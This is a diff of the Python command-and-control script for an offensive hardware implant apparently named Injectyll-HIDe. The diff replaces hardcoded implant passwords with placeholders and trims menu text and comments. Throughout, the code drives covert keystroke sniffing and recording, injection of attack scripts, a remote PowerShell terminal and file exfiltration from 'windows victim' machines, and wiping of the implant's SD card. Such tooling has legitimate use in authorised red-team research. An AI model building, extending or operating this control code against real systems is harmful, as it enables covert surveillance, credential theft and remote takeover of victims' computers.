@@ -12,29 +12,6 @@ from blessed import Terminal
 from digi.xbee.devices import XBeeDevice, RemoteXBeeDevice, XBee64BitAddress
 from os import path
 
-# password variables
-# these must match what is in M2.ino or your devices will not communicate
-# default values have been added below for out-of-the-box functionality
-# WARNING: if you do not change these variables, an attacker can potentially detect and hijack your implant
-activatePW = "DEFAULTactivatePW"              #password for activating implant functions                             - main menu option 3
-getModesPW = "DEFAULTgetModesPW"              #password for getting status of insomnia, key recorder, last key press - main menu option 4
-recKeysEnablePW = "DEFAULTrecKeysEnablePW"    #password for enabling keystroke recording                             - main menu option 8
-recKeysDisablePW = "DEFAULTrecKeysDisablePW"  #password for disabling keystroke recording                            - main menu option 9
-txKeysPW = "DEFAULTtxKeysPW"                  #password for sniffing keystrokes                                      - main menu option 5
-disableKeyTxPW = "DEFAULTdisableKeyTxPW"      #password for disabling sniffing keystrokes                            - main menu option 5
-insomniaPW = "DEFAULTinsomniaPW"              #password for enabling insomnia mode                                   - main menu option 6
-allowSleepPW = "DEFAULTallowSleepPW"          #password for disabling insomnia mode                                  - main menu option 7
-goDarkPW = "DEFAULTgoDarkPW"                  #password for wiping SD card - go dark mode                            - main menu option 11
-injectPW = "DEFAULTinjectPW"                  #password to enable key injection, run script from SD                  - main menu option 14
-rxScriptPW = "DEFAULTrxScriptPW"              #password to transfer an attack script from C2 to SD                   - main menu option 15
-resetPW = "DEFAULTresetPW"                    #password to reset all variables back to default                       - main menu option 18
-deletePW = "DEFAULTdeletePW"                  #password to delete a file on the SD card of a target implant          - main menu option 17
-sendKeysPW = "DEFAULTsendKeysPW"              #password for downloading keystroke recording file from SD to C2       - main menu option 10
-printFilesPW = "DEFAULTprintFilesPW"          #password to print a list of the files on the SD card                  - main menu option 12
-terminalPW = "DEFAULTterminalPW"              #password for starting a remote powershell terminal on windows victim  - main menu option 16
-terminalPWOFF = "DEFAULTterminalPWOFF"        #password for ending a remote powershell terminal on windows victim    - main menu option 16
-exfilPW = "DEFAULTexfilPW"                    #password for copying files from a windows victim to the C2            - main menu option 13
-exfilPWOFF = "DEFAULTexfilPWOFF"              #password for ending copying files from a windows victim to the C2     - main menu option 13
 
 def listToString(l):
     s = ""
@@ -292,23 +269,23 @@ def main_menu():
     print("------Main Menu------")
     print("")
     print("Options:")
-    print("1)  List available target Implants")
+    print("1)  List available targets")
     print("2)  Scan for Implants")
     print("3)  Activate Implants")
-    print("4)  Get Implant information")
-    print("5)  Sniff keystrokes live")
+    print("4)  Get implant information")
+    print("5)  Sniff keystrokes")
     print("6)  Enable Insomnia mode")
     print("7)  Disable Insomnia mode")
-    print("8)  Enable Keystroke recording to SD card")
-    print("9)  Disable Keystroke recording to SD card")
-    print("10) Download keystroke recording from SD to C2")
+    print("8)  Enable Keystroke Recorder")
+    print("9)  Disable Keystroke Recorder")
+    print("10) Download keystroke record")
     print("11) Self-destruct mode")
-    print("12) Get file list from target SD card")
-    print("13) Receive files from a windows victim filesystem (uses powershell)")
+    print("12) Get file list from target")
+    print("13) Receive data file")
     print("14) Launch attack from script")
     print("15) Send attack script")
     print("16) Connect to Interactive Powershell Terminal")
-    print("17) Delete a file on target implant SD card")
+    print("17) Delete a file on target implant")
     print("18) Reset target implant")
     print("19) Exit\n")
 
@@ -399,15 +376,12 @@ def submenu_rx_file(d,p):
                     break
         except (KeyboardInterrupt, Exception) as e:
             print(e)
-            target_tx(d, t, exfilPWOFF)
+            target_tx(d, t, "<<EXFIL_OFF_PASSWORD>>")
             print("User either stopped the process or there was an error.")
             print(e)
             break
 
-#
-# submenu_send_file is used to transfer a file from the C2 to the SD
-# the file can later be run on the victim machine from main menu option 14
-#
+
 def submenu_send_file(d,p):
     print("Choose which device to send file to:")
     t = target_menu()
@@ -435,9 +409,7 @@ def submenu_send_file(d,p):
     except (KeyboardInterrupt, Exception) as e:
         print("User either stopped the process or there was an error.")
     
-#
-# terminal() initiates a remote powershell shell on a windows victim
-#
+
 def terminal(d, p):
     t = target_menu()
     term = Terminal()
@@ -494,9 +466,8 @@ def terminal(d, p):
                         print(term.move_xy(x,y) + inp)
                         x = x+1
     except (Exception, KeyboardInterrupt) as e:
-        # if the function crashes or a CTRL+C is received, kill the remote shell
         print(e)
-        target_tx(d, t, terminalPWOFF)
+        target_tx(d, t, "<<TERMINAL_OFF_PASSWORD>>")
                     
 def submenu_getModes(d, p):
     try:
@@ -589,9 +560,7 @@ def submenu_fileSelect(d, p, o):
     except (Exception, KeyboardInterrupt) as e:
         print(e)
 
-#
-# listFiles gets a list of all the files on the SD card and prints it out
-#
+    
 def listFiles(d, p):
     try:
         t = target_menu()
@@ -636,7 +605,7 @@ def banner():
     print("                $$    $$/                               $$    $$/                                                       ")
     print("                 $$$$$$/                                 $$$$$$/                                                        \n")
     print("\n")
-    print("Injectyll-HIDe version 0.99.1")
+    print("Injectyll-HIDe version 0.99")
     print("Created on: 4-27-21")
     print("Created by Jonathan Fischer and Jeremy Miller\n\n")
 
@@ -663,55 +632,53 @@ def loop():
         elif option == '2':
             scanner(localtime, device)
         elif option == '3':
-            # password for activating implant functions
-            submenu_toggle(device, "Activate all implants", "Activate target implant", activatePW)
+            #password for activating implant functions
+            submenu_toggle(device, "Activate all implants", "Activate target implant", "<<ACTIVATE_PASSWORD>>")
         elif option == '4':
-            # password for retrieving the status of insomnia and key recorder modes
-            submenu_getModes(device, getModesPW)
+            #password for retrieving the status of insomnia and key recorder modes
+            submenu_getModes(device, "<<STATUS_PASSWORD>>")
         elif option == '5':
-            # password for keystroke tx
-            submenu_sniff(device, localtime, txKeysPW, disableKeyTxPW)
+            #password for keystroke tx
+            submenu_sniff(device, localtime, "<<TX1_PASSWORD>>", "<<TX2_PASSWORD>>")
         elif option == '6':
-            # password for Enable insomnia
-            submenu_toggle(device, "Cause global insomnia", "Cause targeted insomnia", insomniaPW)
+            #password for Enable insomnia
+            submenu_toggle(device, "Cause global insomnia", "Cause targeted insomnia", "<<INSOMNIA_PASSWORD>>")
         elif option == '7':
-            # password for Disable insomnia
-            submenu_toggle(device, "Cure global insomnia", "Cure targeted insomnia", allowSleepPW)
+            #password for Disable insomnia
+            submenu_toggle(device, "Cure global insomnia", "Cure targeted insomnia", "<<DISABLE_INSOMNIA_PASSWORD>>")
         elif option == '8':
-            # password for Enabling keystroke recording
-            submenu_toggle(device, "Record keystrokes on all devices", "Record keystrokes on target device", recKeysEnablePW)
+            #password for Enable Recording
+            submenu_toggle(device, "Record keystrokes on all devices", "Record keystrokes on target device", "<<RECORDING_PASSWORD>>")
         elif option == '9':
-            # password for Disable Recording
-            submenu_toggle(device, "Disable recording on all devices", "Disable recording on target", recKeysDisablePW)
+            #password for Disable Recording
+            submenu_toggle(device, "Disable recording on all devices", "Disable recording on target", "<<DISABLE_RECORDING_PASSWORD>>")
         elif option == '10':
-            # password for downloading keystroke recording file from implant SD card to C2
-            submenu_fileSelect(device, sendKeysPW,"rx");
+            #password for downloading keystroke record file
+            submenu_fileSelect(device, "<<DOWNLOAD_KEYSTROKE_PASSWORD>>","rx");
         elif option == '11':
-            # password for Enabling wipe
-            submenu_toggle(device, "Wipe all SD Cards", "Wipe SD Card at target address", goDarkPW)
+            #password for Enabling wipe
+            submenu_toggle(device, "Wipe all SD Cards", "Wipe SD Card at target address", "<<WIPESD_PASSWORD>>")
         elif option == '12':
-            # password to retrieve file list from target SD card
-            listFiles(device, printFilesPW)    
+            #password to retrieve file list from target
+            listFiles(device, "<<GET_SD_PASSWORD>>")    
         elif option == '13':
-            # password for data exfil to transfer a file from a windows victim to the C2
-            # uses a powershell script that executes on the victim
-            submenu_rx_file(device, exfilPW)
+            #password for data exfil
+            submenu_rx_file(device, "<<EXFIL_PASSWORD>>")
         elif option == '14':
-            # password for Enabling key injection
-            submenu_fileSelect(device, injectPW, "no")
+            #password for Enabling key injection
+            submenu_fileSelect(device, "<<KEY_INJECTION_PASSWORD>>", "no")
         elif option == '15':
-            # password for transferring an attack script from C2 to SD
-            submenu_send_file(device, rxScriptPW)
+            #password for transferring over an attack script
+            submenu_send_file(device, "<<SEND_INJECT_PASSWORD>>")
         elif option == '16':
-            # initiate a shell on a windows victim
             print("turning on terminal!")
-            terminal(device, terminalPW)
+            terminal(device, "<<TERMINAL_PASSWORD>>")
         elif option == '17':
-            # password for deleting a file from SD card on a target implant
-            submenu_fileSelect(device, deletePW, "delete")
+            #password for deleting a file from SD card
+            submenu_fileSelect(device, "<<DELETE_FILE_PASSWORD>>","delete")
         elif option == '18':
-            # password for resetting all toggle variables in a target implant
-            submenu_toggle(device, "Reset all devices", "Reset target device", resetPW)
+            #password for resetting all toggle variables in implant
+            submenu_toggle(device, "Reset all devices", "Reset target device", "<<RESET_IMPLANT>>")
         elif option == '19':
             device.close()
             exit()
